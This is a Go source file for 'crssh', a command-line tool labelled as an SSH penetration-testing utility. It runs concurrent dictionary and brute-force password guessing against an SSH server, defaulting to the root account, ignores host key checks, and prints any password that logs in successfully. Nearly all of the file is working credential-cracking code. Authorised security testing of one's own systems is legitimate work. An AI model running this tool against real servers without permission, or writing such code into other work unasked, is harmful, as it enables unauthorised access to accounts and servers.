package cmd

import (
	"context"
	"errors"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/hlts2/gobf"
	"github.com/hlts2/godict"
	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh"
	"golang.org/x/sync/errgroup"
)

const (
	version                    = "v0.0.1"
	concurrencyConnectionLimit = 4
)

type passCracker = gobf.BruteForce

var (
	host              string
	user              string
	port              uint
	size              uint
	bfAttackEnabled   bool
	dictAttackEnabled bool
)

var (
	strPort string
)

func init() {
	rootCmd.Flags().StringVarP(&user, "user", "u", "root", "set user name")
	rootCmd.Flags().BoolVarP(&bfAttackEnabled, "bruteforce", "b", false, "set brute force attack")
	rootCmd.Flags().BoolVarP(&dictAttackEnabled, "dictionary", "d", false, "set dictionary attack")
	rootCmd.Flags().UintVarP(&port, "port", "p", 22, "set port number")
	rootCmd.Flags().UintVarP(&size, "size", "s", 4, "set password size for brute force attack")
}

var rootCmd = &cobra.Command{
	Use:     "crssh",
	Short:   "penetration testing tool for ssh server",
	Version: version,
	Args: func(cmd *cobra.Command, args []string) error {
		if len(args) == 0 {
			return errors.New("requires a host argument")
		}

		h, u, p, _, err := splitUserHostPort(args[0])
		if err != nil {
			return fmt.Errorf("invalid host specified: %w", err)
		}

		if len(h) != 0 {
			host = h
		}
		if len(u) != 0 {
			user = u
		}
		if p != 0 {
			port = p
		}
		strPort = strconv.Itoa(int(port))

		if !bfAttackEnabled && !dictAttackEnabled {
			return errors.New("attack option not set")
		}

		return nil
	},
	RunE: func(cmd *cobra.Command, _ []string) error {
		crs, err := crackers()
		if err != nil {
			return err
		}

		ctx, cancel := context.WithCancel(cmd.Context())
		defer cancel()

		limit := make(chan struct{}, concurrencyConnectionLimit)

		eg, egctx := errgroup.WithContext(ctx)

		for _, cr := range crs {
			cr := cr
			eg.Go(func() error {
				return cr.Do(egctx, func(pass string) {
					config := &ssh.ClientConfig{
						User:            user,
						HostKeyCallback: ssh.InsecureIgnoreHostKey(), // https://github.com/golang/go/issues/19767
						Auth: []ssh.AuthMethod{
							ssh.Password(pass),
						},
						Timeout: 5 * time.Second,
					}

					select {
					case <-egctx.Done():
						return
					case limit <- struct{}{}:
					}

					eg.Go(func() (err error) {
						defer func() {
							select {
							case _ = <-egctx.Done():
								err = egctx.Err()
								return
							case <-limit:
							}
						}()

						conn, err := ssh.Dial("tcp", host+":"+strPort, config)
						if err != nil {
							printStats(pass, err)
							return nil
						}
						defer conn.Close()
						cancel()

						printStats(pass, nil)
						return nil
					})
				})
			})
		}

		err = eg.Wait()
		if err != nil {
			if errors.Is(err, context.Canceled) {
				return nil
			}
		}

		return err
	},
}

func crackers() (crs []passCracker, err error) {
	crs = make([]passCracker, 0, 2)

	if dictAttackEnabled {
		c, err := godict.New()
		if err != nil {
			return nil, fmt.Errorf("failed to create dictionary attach method: %w", err)
		}
		crs = append(crs, c)
	}

	if bfAttackEnabled {
		c, err := gobf.New(
			gobf.WithUpper(true),
			gobf.WithLower(true),
			gobf.WithNumber(true),
			gobf.WithSize(int(size)),
			gobf.WithConcrencyLimit(100000),
		)
		if err != nil {
			return nil, fmt.Errorf("failed to create brute force attach method: %w", err)
		}
		crs = append(crs, c)
	}
	return
}

// TODO: Add processing for ipv6.
func splitUserHostPort(str string) (host, user string, port uint, ipv4 bool, err error) {
	uSplit := strings.Split(str, "@")
	switch len(uSplit) {
	case 1: // ["localhost:8080"]
		host = uSplit[0]
	case 2: // ["user", "localhost:8080"]
		user = uSplit[0]
		host = uSplit[1]
	default:
		return "", "", 0, false, fmt.Errorf("%s  too many \"@\" in host", str)
	}

	hSplit := strings.Split(host, ":")
	switch len(hSplit) {
	case 1: // ["localhost"]
		ipv4 = true
	case 2: // ["localhost", "22"]
		ipv4 = true
		host = hSplit[0]
		uport, err := strconv.ParseUint(hSplit[1], 10, 64)
		if err != nil {
			return "", "", 0, false, fmt.Errorf("%s  invalid port number in host", str)
		}
		port = uint(uport)
	}

	return
}

func printStats(pass string, err error) {
	str := fmt.Sprintf("[crssh] Host: %s\tUser: %s\tPassword: %s", host, user, pass)
	if err != nil {
		fmt.Printf("\033[32mACCOUNT NOT FOUND: %s\tError: %s\n\033[39m", str, err.Error())
	} else {
		fmt.Printf("\033[31mACCOUNT FOUND: %s\n\033[39m", str)
	}
}

// Execute adds all child commands to the root command and sets flags appropriately.
// This is called by main.main(). It only needs to happen once to the rootCmd.
func Execute() {
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}
